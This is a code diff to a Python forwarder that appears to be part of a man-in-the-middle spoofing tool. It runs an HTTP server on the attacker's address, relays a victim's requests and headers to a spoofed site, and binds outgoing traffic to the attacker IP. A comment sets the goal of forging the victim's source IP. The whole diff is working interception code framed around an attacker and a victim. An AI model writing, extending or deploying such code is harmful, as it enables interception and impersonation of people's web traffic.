@@ -3,16 +3,19 @@ import http.client
 import http.server
 import socketserver
 import requests
+from requests_toolbelt.adapters import source
 
 # TODO: Change the forwarder such that the packages sent to the server have the source ip of the victim.
 
 site_to_spoof = None
 ip_victim = None
+ip_attacker = None
 
 # Custom HTTP request handler that only allows requests from the victim.
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def __init__(self, *args, **kwargs):
+        self.s = requests.Session()
         super().__init__(*args, **kwargs)
 
     def do_GET(self):
@@ -26,9 +29,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             print("Path:", self.path)
             print("Headers:", self.headers)
 
-            # Use requests to forward this request to site_to_spoof
-            response = requests.get("https://" + site_to_spoof + self.path, headers=self.headers, )
-            
+            spoofed_source = source.SourceAddressAdapter(ip_attacker)
+            self.s.mount('https://', spoofed_source)
+            response = self.s.get("https://" + site_to_spoof + self.path, headers=self.headers)
+
             # Send the response back to the client
             self.send_response(response.status_code)
             self.end_headers()
@@ -71,10 +75,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
 
 class Forwarder:
-    def __init__(self, interface, ip_attacker, ip_victim_, site_to_spoof_):
-        global ip_victim, site_to_spoof
+    def __init__(self, interface, ip_attacker_, ip_victim_, site_to_spoof_):
+        global ip_victim, site_to_spoof, ip_attacker
         self.interface = interface
-        self.ip_attacker = ip_attacker
+        ip_attacker = ip_attacker_
         ip_victim = ip_victim_
         site_to_spoof = site_to_spoof_
 
@@ -84,7 +88,7 @@ class Forwarder:
         # Start listening for HTTP requests from the victim
         log_info("Starting HTTP server")
         socketserver.TCPServer.allow_reuse_address = True
-        httpd = socketserver.TCPServer((self.ip_attacker, 80), CustomHTTPRequestHandler)
+        httpd = socketserver.TCPServer((ip_attacker, 80), CustomHTTPRequestHandler)
         httpd.serve_forever()
 
         log_warning("Stopping packet forwarding")
